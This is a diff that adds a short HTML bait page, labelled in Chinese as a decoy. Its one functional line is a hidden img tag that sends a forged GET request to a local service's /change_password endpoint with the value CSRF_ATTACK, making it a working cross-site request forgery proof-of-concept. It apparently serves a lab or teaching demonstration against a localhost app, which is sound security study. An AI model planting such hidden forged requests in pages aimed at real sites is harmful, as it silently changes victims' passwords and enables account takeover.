@@ -1,0 +1,7 @@
+<html>
+<body>
+    <h1>这是一个诱饵页面</h1>
+    <!-- 隐藏的图片，触发CSRF -->
+    <img src="http://127.0.0.1:5003/change_password?new_password=CSRF_ATTACK" style="display:none">
+</body>
+</html>
